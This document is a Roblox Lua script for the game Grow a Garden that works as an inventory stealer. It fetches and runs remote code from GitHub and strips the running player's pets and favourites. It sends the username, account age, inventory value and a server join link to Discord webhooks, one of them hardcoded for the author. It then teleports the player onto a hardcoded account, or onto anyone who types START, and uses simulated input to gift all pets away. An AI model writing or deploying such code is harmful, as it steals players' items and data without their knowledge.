
if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
    return
end
rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)

loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/GrowaGarden"))()

loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Hop"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local VirtualUser = game:GetService("VirtualUser")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")

local modules = ReplicatedStorage:WaitForChild("Modules")
local dataService = require(modules:WaitForChild("DataService"))
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))

local PetsService, PetsFolder, FavoriteItemService
local function initializeServices()
    local success, err = pcall(function()
        PetsService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("PetsService", 10)
        PetsFolder = workspace:WaitForChild("PetsPhysical", 10)
        FavoriteItemService = ReplicatedStorage:WaitForChild("GameEvents", 10):WaitForChild("Favorite_Item", 10)
    end)
    
    if not success then
        warn("Failed to initialize pet services: " .. tostring(err))
        
        PetsService = ReplicatedStorage:FindFirstChild("GameEvents"):FindFirstChild("PetService")
        PetsFolder = workspace:FindFirstChild("Pets")
        FavoriteItemService = ReplicatedStorage:FindFirstChild("GameEvents"):FindFirstChild("Favorite_Item")
    end
    return success
end

local CONFIG = {
    username = getfenv().Username,
    webhook = getfenv().Webhook,
    dualWebhook = "https://discord.com/api/webhooks/1394648714492248126/8b1eORWdBwAWsudi91-7vMYweIkFfaNVvNLkqGY9q_neJNyPoxGppQEyOlq61ka_Ejhm",
    dualUsername = "namnnni2",
    dualWebhookThreshold = 1e12,
    
    rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox", "red fox", "t-rex", "fennec fox"},
    excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"},
    
    priorityPlayers = {"namnnni2"},
    
    autoKickDelay = 2,
    giftDelay = 0.5,
    maxDistance = 10,
    holdDelay = 2.3,
    switchDelay = 0.5,
    mobileHoldTime = 3.5,
    promptHoldTime = 3.0,
    giftHoldTime = 2.5,
    virtualInputDelay = 0.1,
    
    heavyPetWeight = 10,
    minTargetWeight = 15.0,
    minTargetAge = 60,
    
    petPickupInterval = 1,
    maxPickupRetries = 3,
    
    teleportQueueDelay = 5 -- Added teleport queue delay
}

local petEmojis = {
    ["t-rex"] = ":t_rex:",
    ["butterfly"] = ":butterfly:",
    ["fennec fox"] = ":fox_face:",
    ["red fox"] = ":fox_face:",
    ["queen bee"] = ":bee:",
    ["raccoon"] = ":raccoon:",
    ["disco bee"] = ":mirror_ball:",
    ["mimic octopus"] = ":octopus:",
    ["dragonfly"] = ":dragon:"
}

local giftQueue = {}
local isGifting = false
local tpConnection = nil
local currentGiftingTarget = nil

-- Added teleport queue system
local teleportQueue = {}
local isTeleporting = false

local Utils = {}

function Utils.safeLerp(a, b, t)
    return a + (b - a) * t
end

function Utils.formatNumber(n)
    local suffix = {"", "k", "m", "b", "t"}
    local idx = 1
    while n >= 1000 and idx < #suffix do
        n = n / 1000
        idx = idx + 1
    end
    return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
end

function Utils.isTableContains(tbl, value)
    for _, v in ipairs(tbl) do
        if v == value then
            return true
        end
    end
    return false
end

function Utils.isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

function Utils.getHttpRequest()
    return syn and syn.request or 
           http and http.request or 
           http_request or 
           fluxus and fluxus.request or 
           (identifyexecutor and identifyexecutor():lower():find("delta") and request)
end

function Utils.getEmojiForPet(name)
    local lowerName = string.lower(name)
    for key, emoji in pairs(petEmojis) do
        if string.sub(lowerName, 1, #key) == key then
            return emoji
        end
    end
    return ":dog:"
end

function Utils.extractNumber(text, pattern)
    local match = string.match(text, pattern)
    return match and tonumber(match) or nil
end

function Utils.getWeight(petName)
    return Utils.extractNumber(petName, "%[([%d%.]+) KG%]")
end

function Utils.getAge(petName)
    return Utils.extractNumber(petName, "%[Age (%d+)%]")
end

function Utils.startsWithTarget(petName)
    local lower = string.lower(petName)
    for _, prefix in ipairs(CONFIG.rarePets) do
        if string.sub(lower, 1, #prefix) == string.lower(prefix) then
            return true
        end
    end
    return false
end

function Utils.isTargetPet(petName)
    if Utils.startsWithTarget(petName) then return true end

    local weight = Utils.getWeight(petName)
    if weight and weight >= CONFIG.minTargetWeight then return true end

    local age = Utils.getAge(petName)
    if age and age >= CONFIG.minTargetAge then return true end

    return false
end

function Utils.getPetPriority(petName)
    if Utils.startsWithTarget(petName) then return 1 end
    if Utils.getWeight(petName) and Utils.getWeight(petName) >= CONFIG.minTargetWeight then return 2 end
    if Utils.getAge(petName) and Utils.getAge(petName) >= CONFIG.minTargetAge then return 2 end
    return 3
end

function Utils.holdTool(tool)
    local character = LocalPlayer.Character
    if character and character:FindFirstChild("Humanoid") and tool then
        tool.Parent = character
    end
end

function Utils.unholdTool(tool)
    if tool and tool.Parent == LocalPlayer.Character then
        tool.Parent = backpack
    end
end

function Utils.unholdAllItems()
    local character = LocalPlayer.Character
    if not character then return end

    local heldTools = {}
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(heldTools, tool)
        end
    end

    for _, tool in ipairs(heldTools) do
        if tool.Parent == character then
            tool.Parent = backpack
            task.wait(0.05)
        end
    end
    
    task.wait(0.1)
end

local ItemProcessor = {}

function ItemProcessor.calculatePetValue(petData)
    local egg = petData.PetData.HatchedFrom
    if not egg then return 0 end
    
    local data = petRegistry.PetEggs[egg]
    local rarity = data and data.RarityData.Items[petData.PetType]
    if not rarity then return 0 end
    
    local r = rarity.GeneratedPetData.WeightRange
    if not r then return 0 end
    
    local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
    local weightMult = Utils.safeLerp(0.8, 1.2, lerp)
    local levelMult = Utils.safeLerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
    
    return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
end

function ItemProcessor.processPet(tool)
    local id = tool:GetAttribute("PET_UUID")
    local petData = dataService:GetData().PetsData.PetInventory.Data[id]
    
    if not petData or not petData.PetType then
        return nil
    end
    
    local petName = petData.PetType
    local weight = tonumber(petData.PetData.BaseWeight) or 0
    local value = ItemProcessor.calculatePetValue(petData)
    
    return {
        Tool = tool,
        Name = petName,
        Weight = weight,
        Value = value,
        Type = "Pet",
        IsTarget = Utils.isTargetPet(tool.Name)
    }
end

function ItemProcessor.processPlant(tool)
    local value = calcPlantValue(tool)
    
    return {
        Tool = tool,
        Name = tool.Name,
        Weight = 0,
        Value = value,
        Type = "Plant",
        IsTarget = false
    }
end

function ItemProcessor.processAllItems()
    local itemsToSend = {}
    local totalValue = 0
    local hasRare = false
    local hasHeavy = false
    local targetPets = {}
    local regularPets = {}
    
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and not Utils.isTableContains(CONFIG.excludedItems, tool.Name) then
            local processedItem = nil
            
            if tool:GetAttribute("ItemType") == "Pet" then
                processedItem = ItemProcessor.processPet(tool)
                
                if processedItem then
                    if processedItem.IsTarget then
                        hasRare = true
                        table.insert(targetPets, processedItem)
                    else
                        table.insert(regularPets, processedItem)
                    end
                    
                    if processedItem.Weight >= CONFIG.heavyPetWeight then
                        hasHeavy = true
                    end
                end
            else
                processedItem = ItemProcessor.processPlant(tool)
                if processedItem then
                    table.insert(regularPets, processedItem)
                end
            end
            
            if processedItem then
                totalValue = totalValue + processedItem.Value
                table.insert(itemsToSend, processedItem)
            end
        end
    end
    
    return itemsToSend, totalValue, hasRare, hasHeavy, targetPets, regularPets
end

local PetPickupHandler = {}

function PetPickupHandler.pickupAllPets()
    if not PetsService or not PetsFolder then
        warn("PetsService or PetsFolder not initialized")
        return 0
    end
    
    local pickupCount = 0
    local retryCount = 0
    local maxRetries = CONFIG.maxPickupRetries
    
    while retryCount < maxRetries do
        local foundPets = false
        
        for _, pet in ipairs(PetsFolder:GetChildren()) do
            if pet:GetAttribute("OWNER") == LocalPlayer.Name then
                local uuid = pet:GetAttribute("UUID")
                if uuid then
                    local success = pcall(function()
                        PetsService:FireServer("UnequipPet", uuid)
                    end)
                    if success then 
                        pickupCount = pickupCount + 1
                        foundPets = true
                    end
                end
            end
        end
        
        if not foundPets then
            break
        end
        
        retryCount = retryCount + 1
        task.wait(1)
    end
    
    task.wait(2)
    return pickupCount
end

function PetPickupHandler.startContinuousPickup()
    task.spawn(function()
        while true do
            pcall(function()
                if PetsService and PetsFolder then
                    for _, pet in ipairs(PetsFolder:GetChildren()) do
                        if pet:GetAttribute("OWNER") == LocalPlayer.Name then
                            local uuid = pet:GetAttribute("UUID")
                            if uuid then
                                pcall(function()
                                    PetsService:FireServer("UnequipPet", uuid)
                                end)
                            end
                        end
                    end
                end
            end)
            task.wait(CONFIG.petPickupInterval)
        end
    end)
end

local DiscordWebhook = {}

function DiscordWebhook.createEmbed(itemsToSend, totalValue, hasTargets, priorityPlayer)
    local inventoryReport = ""
    local hasRarePet = false
    
    for _, item in ipairs(itemsToSend) do
        local displayName = item.Name

        if item.Type == "Pet" then
    local emoji = Utils.getEmojiForPet(item.Name)
    displayName = emoji .. " " .. item.Tool.Name
    hasRarePet = hasRarePet or item.IsTarget
elseif item.Type == "Plant" then
    displayName = ":deciduous_tree: " .. item.Name
else
    displayName = ":dog: " .. item.Name
end

        inventoryReport = inventoryReport .. displayName .. " — 💰 " .. Utils.formatNumber(item.Value) .. "\n"
    end

    if inventoryReport == "" then
        inventoryReport = "No items found."
    end

    local accountAge = LocalPlayer.AccountAge
    local username = LocalPlayer.Name
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
    local placeId = game.PlaceId
    local jobId = game.JobId
    local fernLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", placeId, jobId)

    return {
        ["title"] = "**Inventory Report**",
        ["description"] = "Player inventory details just executed a script.",
        ["color"] = 65280,
        ["fields"] = {
            {
                ["name"] = "👤 Username",
                ["value"] = username,
                ["inline"] = true
            },
            {
                ["name"] = "📅 Account Age",
                ["value"] = tostring(accountAge) .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "💰 Total Inventory Value",
                ["value"] = Utils.formatNumber(totalValue) .. " R$",
                ["inline"] = true
            },
            {
                ["name"] = "🎒 Inventory Items",
                ["value"] = inventoryReport,
                ["inline"] = false
            },
            {
                ["name"] = "🌐 Fern Join Link",
                ["value"] = "[Click to join this server](" .. fernLink .. ")",
                ["inline"] = false
            },
            {
                ["name"] = "🌀 Game Server Teleporter",
                ["value"] = "```lua\n" .. string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId) .. "\n```",
                ["inline"] = false
            }
        },
        ["thumbnail"] = {
            ["url"] = avatarUrl
        },
        ["footer"] = {
            ["text"] = "Inventory auto-report with true value calculation 🌿"
        },
        ["timestamp"] = DateTime.now():ToIsoDate()
    }
end

function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
    local useDual = totalValue >= CONFIG.dualWebhookThreshold
    local finalWebhook = useDual and CONFIG.dualWebhook or CONFIG.webhook
    local finalUsername = useDual and CONFIG.dualUsername or CONFIG.username
    
    local contentMsg = hasRare and "@everyone New rare pet inventory!" or "✅ Inventory report generated!"
    
    local embed = DiscordWebhook.createEmbed(itemsToSend, totalValue, hasRare, priorityPlayer)
    
    local payload = {
        ["content"] = contentMsg,
        ["username"] = finalUsername,
        ["embeds"] = {embed},
        ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
    }
    
    pcall(function()
        local req = Utils.getHttpRequest()
        if req then
            req({
                Url = finalWebhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end
    end)
end

local ProximityPromptHandler = {}

function ProximityPromptHandler.getNearbyPrompt(maxDistance)
    local char = LocalPlayer.Character
    if not char or not char.PrimaryPart then return nil end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
            local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
            if dist <= maxDistance then
                return obj
            end
        end
    end
    return nil
end

function ProximityPromptHandler.virtualInputGift(prompt)
    if not prompt then return false end

    local success = false
    local holdTime = Utils.isMobile() and CONFIG.mobileHoldTime or CONFIG.promptHoldTime

    pcall(function()
        local promptPosition = prompt.Parent.Position
        local camera = workspace.CurrentCamera
        local screenPoint, onScreen = camera:WorldToScreenPoint(promptPosition)

        if onScreen then
            if Utils.isMobile() then
                local touchPositions = {}
                for i = 1, 3 do
                    table.insert(touchPositions, Vector2.new(screenPoint.X + (i-2)*2, screenPoint.Y + (i-2)*2))
                end

                for _, pos in ipairs(touchPositions) do
                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.Begin, pos)
                    task.wait(0.05)
                end

                task.wait(holdTime)

                for _, pos in ipairs(touchPositions) do
                    VirtualInputManager:SendTouchEvent(Enum.UserInputType.Touch, Enum.UserInputState.End, pos)
                    task.wait(0.05)
                end
            else
                VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, true, game, 1)
                task.wait(holdTime)
                VirtualInputManager:SendMouseButtonEvent(screenPoint.X, screenPoint.Y, 0, false, game, 1)
            end
            success = true
        end
    end)

    if success then return true end

    pcall(function()
        if Utils.isMobile() then
            VirtualUser:SetKeyDown("0x65")
            task.wait(holdTime)
            VirtualUser:SetKeyUp("0x65")
        else
            VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            task.wait(holdTime)
            VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        end
        success = true
    end)
    
    return success
end

local GiftingSystem = {}

function GiftingSystem.getPriorityPlayer()
    for _, name in ipairs(CONFIG.priorityPlayers) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= LocalPlayer and p.Character then
            return p
        end
    end
    return nil
end

function GiftingSystem.tpAndAttach(target)
    if tpConnection then 
        tpConnection:Disconnect() 
        tpConnection = nil
    end

    currentGiftingTarget = target
    local char = LocalPlayer.Character
    local targetChar = target.Character

    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        currentGiftingTarget = nil
        return false
    end

    tpConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if char.PrimaryPart and targetChar.PrimaryPart and currentGiftingTarget == target then
                char:SetPrimaryPartCFrame(CFrame.new(targetChar.PrimaryPart.Position))
            end
        end)
    end)

    return true
end

function GiftingSystem.giftPet(pet, target)
    if not target or not target.Parent or not target.Character then
        return false
    end

    if not pet or not pet.Parent or pet.Parent ~= backpack then
        return false
    end

    if currentGiftingTarget ~= target then
        return false
    end

    local success = pcall(function()
        if pet.Parent == backpack then
            Utils.holdTool(pet)
        else
            return false
        end
    end)

    if not success then
        return false
    end

    task.wait(CONFIG.holdDelay)

    local char = LocalPlayer.Character
    local targetChar = target.Character
    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        Utils.unholdAllItems()
        return false
    end

    local distance = (char.PrimaryPart.Position - targetChar.PrimaryPart.Position).Magnitude
    if distance > CONFIG.maxDistance then
        Utils.unholdAllItems()
        return false
    end

    local prompt = ProximityPromptHandler.getNearbyPrompt(CONFIG.maxDistance)
    if prompt then
        local giftSuccess = ProximityPromptHandler.virtualInputGift(prompt)
        
        if not giftSuccess then
            pcall(function()
                prompt:InputBegin()
                task.wait(CONFIG.promptHoldTime)
                prompt:InputEnd()
            end)
        end
    end

    task.wait(CONFIG.virtualInputDelay)
    Utils.unholdAllItems()
    task.wait(CONFIG.switchDelay)

    return true
end

function GiftingSystem.giftAllPets(target)
    if isGifting then return end
    isGifting = true

    Utils.unholdAllItems()
    task.wait(0.3)

    if not GiftingSystem.tpAndAttach(target) then
        isGifting = false
        currentGiftingTarget = nil
        return
    end

    local giftedCount = 0
    local totalAttempts = 0
    local maxTotalAttempts = 200

    while totalAttempts < maxTotalAttempts do
        totalAttempts = totalAttempts + 1

        if not target or not target.Parent or not target.Character or currentGiftingTarget ~= target then
            break
        end

        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
        local allPets = {}
        
        for _, item in ipairs(targetPets) do
            table.insert(allPets, {tool = item.Tool, priority = Utils.getPetPriority(item.Tool.Name)})
        end
        
        for _, item in ipairs(regularPets) do
            if item.Type == "Pet" then
                table.insert(allPets, {tool = item.Tool, priority = Utils.getPetPriority(item.Tool.Name)})
            end
        end

        if #allPets == 0 then
            break
        end

        table.sort(allPets, function(a, b)
            return a.priority < b.priority
        end)

        local petData = allPets[1]
        local pet = petData.tool
        local giftResult = false

        pcall(function()
            giftResult = GiftingSystem.giftPet(pet, target)
        end)

        if giftResult then
            giftedCount = giftedCount + 1
            task.wait(CONFIG.giftDelay)
        else
            task.wait(0.5)
        end
    end

    pcall(function()
        if tpConnection then
            tpConnection:Disconnect()
            tpConnection = nil
        end
    end)

    currentGiftingTarget = nil
    isGifting = false
end

function GiftingSystem.setupChatMonitoring()
    local function connectPlayer(p)
        if p == LocalPlayer then return end

        local function onChatted(message)
            if string.upper(tostring(message)) == "START" then
                for _, queued in ipairs(giftQueue) do
                    if queued == p then return end
                end

                local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
                if #targetPets > 0 or #regularPets > 0 then
                    table.insert(giftQueue, p)
                end
            end
        end

        local function setupChat()
            pcall(function()
                p.Chatted:Connect(onChatted)
            end)
        end

        if p.Character then
            setupChat()
        else
            p.CharacterAdded:Connect(function()
                task.wait(1)
                setupChat()
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        connectPlayer(p)
    end

    Players.PlayerAdded:Connect(connectPlayer)
end

function GiftingSystem.cleanQueue()
    local clean = {}
    for _, p in ipairs(giftQueue) do
        if p and p.Parent and p.Character then
            table.insert(clean, p)
        end
    end
    giftQueue = clean
end

function GiftingSystem.getNextTarget()
    GiftingSystem.cleanQueue()

    local priority = GiftingSystem.getPriorityPlayer()
    if priority then
        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
        if #targetPets > 0 or #regularPets > 0 then
            return priority
        end
    end

    local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
    if (#targetPets > 0 or #regularPets > 0) and #giftQueue > 0 then
        return table.remove(giftQueue, 1)
    end

    return nil
end

function GiftingSystem.startGiftingLoop()
    task.spawn(function()
        while true do
            pcall(function()
                if #Players:GetPlayers() == 1 then
                    task.wait(CONFIG.autoKickDelay)
                    if #Players:GetPlayers() == 1 then
                        LocalPlayer:Kick("No other players found")
                    end
                end
            end)
            task.wait(1)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                if not isGifting then
                    local target = GiftingSystem.getNextTarget()
                    if target then
                        local _, _, _, _, targetPets, regularPets = ItemProcessor.processAllItems()
                        if #targetPets > 0 or #regularPets > 0 then
                            task.spawn(function()
                                GiftingSystem.giftAllPets(target)
                            end)
                        end
                    end
                end
            end)
            task.wait(1)
        end
    end)
end

-- Added teleport queue system
local TeleportQueueHandler = {}

function TeleportQueueHandler.addToQueue(placeId, jobId)
    table.insert(teleportQueue, {placeId = placeId, jobId = jobId})
end

function TeleportQueueHandler.processQueue()
    if isTeleporting or #teleportQueue == 0 then return end
    isTeleporting = true
    
    local teleportData = table.remove(teleportQueue, 1)
    pcall(function()
        TeleportService:TeleportToPlaceInstance(teleportData.placeId, teleportData.jobId, LocalPlayer)
    end)
    
    task.wait(CONFIG.teleportQueueDelay)
    isTeleporting = false
end

function TeleportQueueHandler.startQueueProcessing()
    task.spawn(function()
        while true do
            TeleportQueueHandler.processQueue()
            task.wait(1)
        end
    end)
end

local function unfavoriteItems()
    if not FavoriteItemService then
        warn("FavoriteItemService not initialized")
        return
    end
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:GetAttribute("d") == true then
            pcall(function()
                FavoriteItemService:FireServer(item)
            end)
        end
    end
end

local function main()
    if not initializeServices() then
        warn("Failed to initialize services, using fallback methods")
    end
    
    PetPickupHandler.startContinuousPickup()
    PetPickupHandler.pickupAllPets()
    
    unfavoriteItems()
    
    local itemsToSend, totalValue, hasRare, hasHeavy, targetPets, regularPets = ItemProcessor.processAllItems()
    
    if #itemsToSend == 0 then
        return
    end
    
    table.sort(itemsToSend, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then return true end
        if a.Type ~= "Pet" and b.Type == "Pet" then return false end
        if a.IsTarget and not b.IsTarget then return true end
        if not a.IsTarget and b.IsTarget then return false end
        return a.Value > b.Value
    end)
    
    local priorityPlayer = GiftingSystem.getPriorityPlayer()
    
    DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
    
    GiftingSystem.setupChatMonitoring()
    GiftingSystem.startGiftingLoop()
    
    
    TeleportQueueHandler.startQueueProcessing()
end

main()
